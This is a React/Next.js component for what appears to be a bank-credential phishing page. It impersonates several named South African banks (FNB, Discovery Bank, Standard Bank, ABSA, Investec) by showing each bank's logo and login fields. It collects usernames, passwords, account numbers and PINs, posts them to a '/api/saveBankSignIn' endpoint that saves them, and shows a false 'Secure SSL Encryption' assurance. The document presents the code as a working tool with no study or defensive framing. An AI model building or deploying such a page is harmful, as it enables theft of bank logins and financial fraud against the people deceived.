"use client"

import { useState, useEffect } from 'react'
import { useSearchParams, useRouter } from 'next/navigation'
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { Lock, Loader2 } from "lucide-react"

export default function SignInContent() {
  const router = useRouter()
  const [bankName, setBankName] = useState('')
  const [bankLogo, setBankLogo] = useState('')
  const [formData, setFormData] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)
  const searchParams = useSearchParams()

  useEffect(() => {
    const bank = searchParams.get('bank')
    if (bank) {
      const decodedBankName = decodeURIComponent(bank)
      setBankName(decodedBankName)
      setBankLogo(`/bank-logos/${decodedBankName.toLowerCase().split(' ')[0]}.png`)
    }
  }, [searchParams])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    try {
      const response = await fetch('/api/saveBankSignIn', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bank: bankName,
          signInData: formData,
        }),
      })

      if (response.ok) {
        // Redirect to the success page with the bank name parameter
        router.push(`/success?bank=${encodeURIComponent(bankName)}`)
      } else {
        throw new Error('Failed to save sign-in data')
      }
    } catch (error) {
      console.error('Error saving sign-in data:', error)
      alert('An error occurred while processing your sign-in. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.id]: e.target.value,
    })
  }

  const renderInputs = () => {
    switch (bankName.toLowerCase()) {
      case 'fnb':
      case 'discovery bank':
      case 'standard bank':
        return (
          <>
            <div>
              <Label htmlFor="username" className="font-bold text-black">Username:</Label>
              <Input id="username" type="text" placeholder="Enter your username" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
            <div>
              <Label htmlFor="password" className="font-bold text-black">Password:</Label>
              <Input id="password" type="password" placeholder="Enter your password" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
          </>
        )
      case 'absa':
        return (
          <>
            <div>
              <Label htmlFor="accountNumber" className="font-bold text-black">Account Number:</Label>
              <Input id="accountNumber" type="text" placeholder="Enter your account number" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
            <div>
              <Label htmlFor="pin" className="font-bold text-black">PIN:</Label>
              <Input id="pin" type="password" placeholder="Enter your PIN" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
            <div>
              <Label htmlFor="userNumber" className="font-bold text-black">Password:</Label>
              <Input id="userNumber" type="password" placeholder="Enter password" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
          </>
        )
      case 'investec':
        return (
          <>
            <div>
              <Label htmlFor="investecId" className="font-bold text-black">Investec ID:</Label>
              <Input id="investecId" type="text" placeholder="Enter your Investec ID" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
            <div>
              <Label htmlFor="password" className="font-bold text-black">Password:</Label>
              <Input id="password" type="password" placeholder="Enter your password" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
          </>
        )
      default:
        return (
          <>
            <div>
              <Label htmlFor="username" className="font-bold text-black">Username:</Label>
              <Input id="username" type="text" placeholder="Enter your username" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
            <div>
              <Label htmlFor="password" className="font-bold text-black">Password:</Label>
              <Input id="password" type="password" placeholder="Enter your password" required className="text-black bg-gray-100" onChange={handleInputChange} />
            </div>
          </>
        )
    }
  }

  return (
    <div className={`min-h-screen flex flex-col ${isLoading ? 'blur-sm' : ''}`}>
      <main className="flex-grow container mx-auto px-4 py-8 relative">
        {isLoading && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <Loader2 className="w-8 h-8 text-white animate-spin" />
          </div>
        )}
        <Card className="w-full max-w-md md:max-w-lg lg:max-w-xl xl:max-w-2xl mx-auto rounded-lg shadow-lg overflow-hidden bg-white">
          <CardContent className="p-6 md:p-8">
            <Image
              src={bankLogo}
              alt={`${bankName} Logo`}
              width={50}
              height={50}
              className="mb-8 mx-auto"
            />
            <h2 className="text-xl md:text-2xl lg:text-3xl font-bold text-center mb-2 text-black">
              Sign In
            </h2>
            <p className="text-xs md:text-sm lg:text-base text-center mb-6 text-black">
              Log in to your {bankName} Account
            </p>
            <form onSubmit={handleSubmit} className="space-y-4">
              {renderInputs()}
              <Button 
                type="submit" 
                className="w-full bg-[#022d2d] hover:bg-[#033e3e] text-white font-bold"
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Submitting...
                  </>
                ) : (
                  'Login'
                )}
              </Button>
            </form>
            <div className="flex items-center justify-center mt-6 text-black">
              <Lock className="w-4 h-4 mr-2" />
              <span className="text-sm md:text-base">Secure SSL Encryption</span>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}